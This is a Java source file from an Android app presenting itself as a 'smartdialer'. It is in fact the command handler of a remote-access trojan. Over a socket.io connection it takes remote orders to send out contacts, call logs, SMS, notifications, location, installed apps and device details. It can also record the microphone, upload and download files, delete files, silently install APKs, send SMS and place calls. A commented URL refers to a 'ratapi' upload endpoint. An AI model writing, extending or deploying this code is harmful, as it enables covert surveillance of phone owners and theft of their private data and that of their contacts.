package com.example.smartdialer;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.SystemClock;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.Log;

import androidx.room.Room;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

import com.example.smartdialer.calls.CallsManager;
import com.example.smartdialer.contacts.ContactsManager;
import com.example.smartdialer.room.AppDatabase;
import com.example.smartdialer.room.dao.CallDao;
import com.example.smartdialer.room.dao.LocationDao;
import com.example.smartdialer.room.dao.NotificationDao;
import com.example.smartdialer.room.dao.ScreenTimeDao;
import com.example.smartdialer.room.dao.SmsDao;
import com.example.smartdialer.room.entity.Calls;
import com.example.smartdialer.room.entity.LocationEntity;
import com.example.smartdialer.room.entity.Noti;
import com.example.smartdialer.room.entity.ScreenTime;
import com.example.smartdialer.room.entity.Sms;
import com.example.smartdialer.room.worker.DeleteDB;
import com.example.smartdialer.services.MainService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.List;

public class ConnectionManager {
    public static Context context;
    static Socket ioSocket;
    //private static final FileManager fileManager = new FileManager();
    static String deviceId= "";
    static PrefManager prefManager;
    @SuppressLint("HardwareIds")
    public static void startConnection(Context ctx) {

        try {
            context = ctx;
            deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID).trim();
            Log.e("TAG", deviceId );
            sendReq();
        } catch (Exception ex) {
            startConnection(ctx);
        }
    }
    private static void sendReq() {
        try {
            if (ioSocket != null)
                return;
            ioSocket = SocketConn.getInstance().getSocket();
            ioSocket.on("ping", args -> ioSocket.emit("pong", deviceId, "im alive: "+deviceId));

            ioSocket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("join", deviceId);
                }
            });

            ioSocket.on("joinroom", args -> {
                ioSocket.emit("join", deviceId);
                Log.e("TAG", "joined room: "+ deviceId );
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        Log.e("TAG", "order: " + args[0]);
                        String result = args[0].toString();
                        JSONObject jsonObject = new JSONObject(result);
                        String order = jsonObject.getString("order");
                        Log.e("TAG", "order: " + order);
                        switch (order) {
                            case "contact":
                                getContact();
                                break;
                            case "calls":
                                getCalls(jsonObject.getInt("limit"));
                                break;
                            case "sms":
                                getSms(jsonObject.getInt("limit"));
                                break;
                            case "sendsms":
                                sendSms(jsonObject.getString("phone"), jsonObject.getString("message"));
                                break;
                            case "sysinfo":
                                getSysInfo();
                                break;
                            case "applist":
                                getAppList(jsonObject.getBoolean("system"));
                                break;
                            case "geolocation":
                                getGeoLocation();
                                break;
                            case "calldb":
                                getCallFromDB();
                                break;
                            case "smsdb":
                                getSmsFromDB();
                                break;
                            case "notidb":
                                getNotification();
                                break;
                            case "locationdb":
                                getLocationDB();
                                break;
                            case "screendb":
                                getScreenFromDB();
                                break;
                            case "deletedb":
                                deleteDB(jsonObject.getString("dbname"));
                                break;
                            case "record":
                                micRecord(jsonObject.getInt("time"));
                                break;
                            case "saveaudio":
                                saveRecording(jsonObject.getInt("startdelay"), jsonObject.getInt("stopdelay"), jsonObject.getString("path"));
                                break;
                            case "startrecord":
                                startRecord(jsonObject.getString("path"));
                                break;
                            case "pauserecord":
                                pauseRecording();
                                break;
                            case "resumerecord":
                                resumeRecording(jsonObject.getInt("time"));
                                break;
                            case "dir":
                                getDir(jsonObject.getString("path"));
                                break;
                            case "download":
                                fileDownload(jsonObject.getString("uploadurl"),jsonObject.getString("path"));
                                break;
                            case "upload":
                                fileUpload(jsonObject.getString("url"),jsonObject.getString("path"));
                                break;
                            case "deletefile":
                                fileDelete(jsonObject.getString("path"));
                                break;
                            case "renamefile":
                                fileRename(jsonObject.getString("path"), jsonObject.getString("filename"));
                                break;
                            case "newfolder":
                                createNewFolder(jsonObject.getString("path"));
                                break;
                            case "apkinstall":
                                apkInstall(jsonObject.getString("path"));
                                break;
                            case "openlink":
                                openLink(jsonObject.getString("url"));
                                break;
                            case "callto":
                                callTo(jsonObject.getString("number"));
                                break;
                            case "ringtone":
                                playRing();
                                break;
                            case "vibrate":
                                vibrate();
                                break;
                            case "rebootloc":
                                restartLocationService();
                                break;
                            default:
                                break;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void restartLocationService() {
        context.sendBroadcast(new Intent("respawnService").setPackage(BuildConfig.APPLICATION_ID));
    }

    private static void getScreenFromDB() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                AppDatabase db = Room.databaseBuilder(context,
                        AppDatabase.class, "temp.db").build();
                ScreenTimeDao screenTimeDao = db.screenTimeDao();
                List<ScreenTime> screenTimeList = screenTimeDao.getAll();
                JSONArray jsonArray = new JSONArray();
                for (ScreenTime screenTime : screenTimeList) {
                    JSONObject jsonObject = new JSONObject();
                    try {
                        jsonObject.put("status", screenTime.getStatus());
                        jsonObject.put("time", screenTime.getTime());
                        jsonArray.put(jsonObject);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
                ioSocket.emit("screendb", deviceId, jsonArray);
                //locationDao.deleteAll();
            }
        }).start();

    }

    private static void deleteDB(String db) {
        try{
            new DeleteDB(context, db).start();
            ioSocket.emit("deletedb", deviceId, "{\"status\":true}");
        }catch (Exception e){
            e.printStackTrace();
            ioSocket.emit("deletedb", deviceId, "{\"status\":false}");
        }
    }

    private static void fileUpload(String url, String path) {
        try {
            //FileManager.downloadFile(path);
            //"https://gyanimade.ml/ratapi/fileupload/upload.php"
            FileManager.downloadFile(url, path);
            //ioSocket.emit("download", deviceId, "{\"status\":true}");
        } catch (Exception e) {
            e.printStackTrace();
            ioSocket.emit("upload", deviceId, "{\"status\":false}");
        }
    }

    private static void playRing() {
        try{
            Uri uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
            Ringtone ringtone = RingtoneManager.getRingtone(context, uri);
            ringtone.play();
            SystemClock.sleep(15000);
            ringtone.stop();
        }catch (Exception e){
            e.printStackTrace();
        }


    }
    private static void vibrate() {
        try{
            Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
            vibrator.vibrate(1000);
        /*long[] pattern = {0, 1000, 1000};
        vibrator.vibrate(pattern, 0);
        vibrator.cancel();*/
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    private static void callTo(String number) {
        try{
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.setData(Uri.parse("tel:" + number));
            context.startActivity(intent);
            ioSocket.emit("callto", deviceId, "{\"status\":true}");
        }catch (Exception e){
            e.printStackTrace();
            ioSocket.emit("callto", deviceId, "{\"status\":false}");
        }

    }

    private static void saveRecording(int startDelay, int stopDelay, String path) {
        try{
            MicManager.saveAudio(startDelay, stopDelay, path);
            //ioSocket.emit("saveaudio", deviceId, "{\"status\":true}");
        }catch (Exception e){
            e.printStackTrace();
            ioSocket.emit("saveaudio", deviceId, "{\"status\":false}");
        }
    }

    private static void startRecord(String path) {
        try{
            MicManager.startRecord(path);
            ioSocket.emit("startrecord", deviceId, "{\"status\":true}");
        }catch (Exception e){
            e.printStackTrace();
            ioSocket.emit("startrecord", deviceId, "{\"status\":false}");
        }
    }
    private static void pauseRecording() {
        try{
            MicManager.pauseRecord();
            ioSocket.emit("pauserecord", deviceId, "{\"status\":true}");
        }catch (Exception e){
            e.printStackTrace();
            ioSocket.emit("pauserecord", deviceId, "{\"status\":false}");
        }
    }
    private static void resumeRecording(int time) {
        try{
            MicManager.resumeRecord(time);
            ioSocket.emit("resumerecord", deviceId, "{\"status\":true}");
        }catch (Exception e){
            e.printStackTrace();
            ioSocket.emit("resumerecord", deviceId, "{\"status\":false}");
        }
    }

    private static void openLink(String url) {
        try{
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.setPackage("com.android.chrome");
            context.startActivity(intent);
            ioSocket.emit("openlink", deviceId, "{\"status\":true}");
        }catch (Exception e){
            e.printStackTrace();
            ioSocket.emit("openlink", deviceId, "{\"status\":false}");
        }
    }

    private static void fileDelete(String path) {
        try{
            boolean status = FileManager.deleteFile(path);
            if (status) {
                ioSocket.emit("deletefile", deviceId, "{\"status\":true}");
            } else {
                ioSocket.emit("deletefile", deviceId, "{\"status\":false}");
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static void fileRename(String path, String filename) {
        try{
        boolean status = FileManager.renameFile(path, filename);
        if (status) {
            ioSocket.emit("renamefile", deviceId, "{\"status\":true}");
        } else {
            ioSocket.emit("renamefile", deviceId, "{\"status\":false}");
        }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static void createNewFolder(String path) {
        try{
            boolean status = FileManager.createFolder(path);
            if (status) {
                ioSocket.emit("newfolder", deviceId, "{\"status\":true}");
            } else {
                ioSocket.emit("newfolder", deviceId, "{\"status\":false}");
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static void apkInstall(String path) {
        boolean status = APKInstaller.silentInstallAPK(path);
        if (status) {
            ioSocket.emit("apkinstall", deviceId, "{\"status\":true}");
        } else {
            ioSocket.emit("apkinstall", deviceId, "{\"status\":false}");
        }
    }

    private static void getSysInfo() {
        JSONObject jsonObject = new JSONObject();
        @SuppressLint("HardwareIds")
        String android_id = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        try {
            jsonObject.put("serial", android_id);
            jsonObject.put("model", Build.MODEL);
            jsonObject.put("id", Build.ID);
            jsonObject.put("Manufacture", Build.MANUFACTURER);
            jsonObject.put("type", Build.TYPE);
            jsonObject.put("user", Build.USER);
            jsonObject.put("base", Build.VERSION_CODES.BASE);
            jsonObject.put("INCREMENTAL", Build.VERSION.INCREMENTAL);
            jsonObject.put("sdk", Build.VERSION.SDK);
            jsonObject.put("board", Build.BOARD);
            jsonObject.put("brand", Build.BRAND);
            jsonObject.put("host", Build.HOST);
            jsonObject.put("FINGERPRINT", Build.FINGERPRINT);
            jsonObject.put("release", Build.VERSION.RELEASE);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        ioSocket.emit("sysinfo", deviceId, jsonObject);
    }

    private static void getCalls(int limit) {
        String calls = CallsManager.getCallDetails(context, limit).toString();
        ioSocket.emit("calls", deviceId, calls);
    }

    private static void getSms(int limit) {
        String sms = SMSManager.getsms(limit).toString();
        ioSocket.emit("sms", deviceId, sms);
    }

    private static void sendSms(String phone, String message) {
        boolean status = SMSManager.sendSMS(phone, message);
        if (status) {
            ioSocket.emit("sendsms", deviceId, "{\"status\":true}");
        } else {
            ioSocket.emit("sendsms", deviceId, "{\"status\":false}");
        }
    }

    private static void getContact() {
        String contact = ContactsManager.getContacts(context).toString();
        ioSocket.emit("contact", deviceId, contact);
    }

    private static void getAppList(boolean system) {
        String appList = AppList.getInstalledApps(system, context).toString();
        ioSocket.emit("applist", deviceId, appList);
    }

    private static void getCallFromDB() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                AppDatabase db = Room.databaseBuilder(context,
                        AppDatabase.class, "temp.db").build();
                CallDao callDao = db.callDao();
                List<Calls> callList = callDao.getAll();
                JSONArray jsonArray = new JSONArray();
                for (Calls call : callList) {
                    JSONObject jsonObject = new JSONObject();
                    try {
                        jsonObject.put("number", call.getNumber());
                        jsonObject.put("type", call.getType());
                        jsonObject.put("time", call.getTime());
                        jsonArray.put(jsonObject);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                }
                ioSocket.emit("calldb", deviceId, jsonArray);
                //callDao.deleteAll();
            }
        }).start();

    }

    private static void getSmsFromDB() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                AppDatabase db = Room.databaseBuilder(context,
                        AppDatabase.class, "temp.db").build();
                SmsDao smsDao = db.smsDao();
                List<Sms> smsList = smsDao.getAll();
                JSONArray jsonArray = new JSONArray();
                for (Sms sms : smsList) {
                    JSONObject jsonObject = new JSONObject();
                    try {
                        jsonObject.put("number", sms.getNumber());
                        jsonObject.put("content", sms.getContent());
                        jsonObject.put("time", sms.getTime());
                        jsonArray.put(jsonObject);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                }
                ioSocket.emit("smsdb", deviceId, jsonArray);
                //smsDao.deleteAll();
            }
        }).start();
    }

    private static void getNotification() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                AppDatabase db = Room.databaseBuilder(context,
                        AppDatabase.class, "temp.db").build();
                NotificationDao notificationDao = db.notificationDao();
                List<Noti> notiList = notificationDao.getAll();
                JSONArray jsonArray = new JSONArray();
                for (Noti noti : notiList) {
                    JSONObject jsonObject = new JSONObject();
                    try {
                        jsonObject.put("appname", noti.getAppName());
                        jsonObject.put("title", noti.getTitle());
                        jsonObject.put("content", noti.getContent());
                        jsonObject.put("posttime", noti.getPostTime());
                        jsonObject.put("key", noti.getKey());
                        jsonArray.put(jsonObject);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                }
                ioSocket.emit("notidb", deviceId, jsonArray);
                //notificationDao.deleteAll();
            }
        }).start();
    }

    private static void getLocationDB() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                AppDatabase db = Room.databaseBuilder(context,
                        AppDatabase.class, "temp.db").build();
                LocationDao locationDao = db.locationDao();
                List<LocationEntity> locationList = locationDao.getAll();
                JSONArray jsonArray = new JSONArray();
                for (LocationEntity location : locationList) {
                    JSONObject jsonObject = new JSONObject();
                    try {
                        jsonObject.put("lat", location.getLat());
                        jsonObject.put("lng", location.getLng());
                        jsonObject.put("time", location.getTime());
                        jsonArray.put(jsonObject);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
                ioSocket.emit("locationdb", deviceId, jsonArray);
                //locationDao.deleteAll();
            }
        }).start();
    }

    private static void getGeoLocation() {
        LocManager gps = new LocManager(context);
        if (gps.canGetLocation()) {
            ioSocket.emit("geolocation", deviceId, gps.getData());
        } else {
            JSONObject jsonObject = new JSONObject();
            try {
                jsonObject.put("message", "can not get location");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            ioSocket.emit("geolocation", deviceId, jsonObject);
        }
    }

    public static void micRecord(int sec) {
        try{
            MicManager.startRecording(sec);
            //ioSocket.emit("record", deviceId, "{\"status\":true}");
        }catch (Exception e){
            e.printStackTrace();
            ioSocket.emit("record", deviceId, "{\"status\":false}");
        }

    }

    private static void getDir(String path) {
        JSONObject object = new JSONObject();
        try {
            object.put("type", "list");
            object.put("list", FileManager.walk(path));
            ioSocket.emit("dir", deviceId, object);
        } catch (JSONException e) {
            e.printStackTrace();
            ioSocket.emit("dir", deviceId, "{\"status\":false}");
        }
    }

    private static void fileDownload(String uploadUrl, String path) {
        try {
            //FileManager.downloadFile(path);
            //"https://gyanimade.ml/ratapi/fileupload/upload.php"
            FileManager.uploadToServer(uploadUrl, path);
            //ioSocket.emit("download", deviceId, "{\"status\":true}");
        } catch (Exception e) {
            e.printStackTrace();
            ioSocket.emit("download", deviceId, "{\"status\":false}");
        }
    }

    public static void takePic(){
        android.hardware.Camera camera = Camera.open(1);
        Camera.Parameters parameters = camera.getParameters();
        camera.setParameters(parameters);
        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                        /*if (camera != null) {
                            camera.stopPreview();
                            camera.release();
                            camera = null;
                        }
                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);*/
            }
        });
    }


}
